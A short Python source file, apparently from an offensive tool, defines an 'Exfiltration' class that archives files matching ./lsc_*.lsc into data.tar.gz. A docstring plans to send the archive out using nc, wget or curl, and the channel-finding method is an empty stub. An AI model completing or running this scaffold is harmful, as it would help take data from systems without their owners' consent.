"""
Exfiltration module
"""
import os
from modules.execute_command import ExecuteCommand

class Exfiltration(object):
    """
    Exfiltration object
    """
    executor = ExecuteCommand()

    def __init__(self):
        return

    def exfiltrate(self):
        """
        exfiltrate a message
        todo flesh out, probably something like determine a route home and push, nc wget, curl, etc.
        """
        filename = "data.tar.gz"

        self.executor.execute_command("tar -czvf data.tar.gz ./lsc_*.lsc")

        if os.path.isfile("./data.tar.gz"):
            return filename

    def find_channel(self):
        """
        determine channel or protocol to send through
        """
        return self
